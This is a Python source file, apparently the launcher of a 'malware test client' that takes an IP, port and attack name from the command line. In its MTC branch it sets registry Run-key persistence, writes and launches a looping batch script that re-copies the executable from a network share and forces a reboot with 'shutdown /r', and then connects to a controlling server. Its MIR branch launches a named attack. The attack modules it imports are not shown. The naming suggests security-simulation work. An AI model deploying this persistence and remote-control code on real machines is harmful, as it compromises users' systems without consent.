from PacketFormat import *
from global_header import *
from Client import *
from Server import *
from MIR import *
from other import *
import sys
from threading import Thread

# ip = "192.168.38.4"
# port = 90
# backup_folder = r'c:\Desktop\test.exe'
ip=None
port=None
backup_folder=""
mir_action = None

print("Command is '{}'".format(sys.argv))

### Process the arguments.
if (len(sys.argv) < 6 or len(sys.argv) > 8):
    print("Invalid command syntax.\nCommand syntax: malwareclienttest.exe <mtc | mir> -i <ip> -p <port> -a <attack name in MIR> [-b <backupfolder>]")
    exit(FAILURE)
else:
    type:str = sys.argv[1]
    for (x,y) in zip(sys.argv[2::2], sys.argv[3::2]):
        print("Debug::Parameters are {}:{}".format(x,y))
        if(x == '-i'):
            ip = y
        elif(x == '-p'):
            port = int(y)
        elif(x == '-b'):
            backup_folder = y
        elif(x == '-a'):
            mir_action = y
    if ip is None or port is None:
        print("ERROR:: IP or Port is not mentioned.")
        sys.exit(FAILURE)


if(type.upper() == "MTC"):
    ## Add a startup script in register to start the client setup after reboot.
    command = r'REG ADD HKCU\software\microsoft\windows\currentversion\run /V "malwaretestclient.exe" /t REG_SZ /D "C:\Users\{}\Desktop\malwaretestclient.exe mtc -i {} -p {}" /f'.format(os.getlogin(), ip, port)
    print("Registry script is {}".format(command))
    execute_command(command)

    ## Add a script to verify if the client file is present in the specified location. If not then copy the file and reboot the machine.
    startup_script = getFileName("setup_startup")
    output = os.path.exists(startup_script)
    if output == False:
        print("Creating start script for test setup.")
        # command = '@ECHO OFF\nSET BACKUP_FOLDER="{}"\nIF NOT DEFINED BACKUP_FOLDER SET BACKUP_FOLDER="\\10.5.155.19\\files\\application\malwaretestclient.exe"\necho %BACKUP_FOLDER%\nSET IP="{}"\nSET PORT="{}"\necho %USERPROFILE%\Desktop\ \ncd %USERPROFILE%\Desktop\ \nif not exist %BACKUP_FOLDER% ( \nsleep 10\n	exit()\n)\nif not exist malwaretestclient.exe (\n	copy %BACKUP_FOLDER% "malwaretestclient.exe"\n	)\nif not exist mt_startup_script.bat (\n	malwaretestclient.exe mtc %IP% %PORT%\n)'.format(backup_folder, ip, port)
        # command = '@ECHO OFF\nSET BACKUP_FOLDER="{}"\nIF %BACKUP_FOLDER%=="" SET BACKUP_FOLDER="\\\\10.5.155.19\\files\Application\malwaretestclient.exe"\necho %BACKUP_FOLDER%\nSET IP="{}"\nSET PORT="{}"\necho %USERPROFILE%\Desktop\ \ncd %USERPROFILE%\Desktop\ \n\nif not exist %BACKUP_FOLDER% ( \necho "%BACKUP_FOLDER% not available" \npause\nexit\n)\n\n:LOOP\nif not exist malwaretestclient.exe (\n	copy %BACKUP_FOLDER% "malwaretestclient.exe"\n	echo malwaretestclient.exe mtc -i %IP% -p %PORT% -b %BACKUP_FOLDER%\n	malwaretestclient.exe mtc -i %IP% -p %PORT% -b %BACKUP_FOLDER%\n	) else echo "Monitoring"\nping 127.0.0.1 -n 10 > nul\ngoto :LOOP'.format(backup_folder, ip, port)
        command = '@ECHO OFF\nSET BACKUP_FOLDER="{}"\nIF %BACKUP_FOLDER%=="" SET BACKUP_FOLDER="\\\\10.5.155.19\\files\Application\malwaretestclient.exe"\necho %BACKUP_FOLDER%\nSET IP="{}"\nSET PORT="{}"\necho %USERPROFILE%\Desktop\ \ncd %USERPROFILE%\Desktop\ \n\nif not exist %BACKUP_FOLDER% ( \necho "%BACKUP_FOLDER% not available" \npause\nexit\n)\n\n:LOOP\nif not exist malwaretestclient.exe (\n	copy %BACKUP_FOLDER% "malwaretestclient.exe"\n	echo malwaretestclient.exe mtc -i %IP% -p %PORT% -b %BACKUP_FOLDER%\n	shutdown /r \n	) else echo "Monitoring"\nping 127.0.0.1 -n 10 > nul\ngoto :LOOP'.format(backup_folder, ip, port)
        bat = batFile("reboot", startup_script, command)
        bat.batProcess()
        print("Startp script is {}".format(startup_script))
        t1 = threading.Thread(target=execute_command, args=('"{}"'.format(startup_script),))
        t1.start()


    time.sleep(20)
    # Cleaning up the system before the MTC starts.
    #=====================================================
    print("Cleaning up the system before starting the setup")
    print("Deleting registry keys")
    execute_command(r'REG DELETE HKCU\software\microsoft\windows\currentversion\run /ve /f')
    time.sleep(1)
    print("Deleting files that was created before reboot.")
    file_list = [getFileName("documentscript"), getFileName("reboot_startup")]
    for path in file_list:
        output = os.path.exists(path)
        print("Exist: {}: {}".format(path, output))
        if output == True:
            print("Executing command: del {}".format(path))
            execute_command('del "{}"'.format(path))
        time.sleep(2)
    #=====================================================

    setServerIP(ip)
    setServerPort(port)

    client_obj = MTCProcess(ip, port)
    while(1):
        status = client_obj.process()
        if(status == 1):
            ip, port = client_obj.createIPPort()
            client_obj.mtc_close()
            break
        else:
            print("Failed the MTC connection process")
            exit(0)


    server_obj = server_process(ip, int(port))
    new_sock = server_obj.connectionSocketGet()
    print("{}".format(new_sock))
    # thr = Thread(target=server_obj.srv_process_child, args=(new_sock)).start()
elif(type.upper() == "MIR"):
    if mir_action is None:
        print("Error::Attack name is not mentioned")
        exit(FAILURE)
    setAttackAction(mir_action)
    obj = MIR_Process(ip, port)
else:
    print("ERROR::Invalid type '{}'. It should be either MIR or MTC".format(type))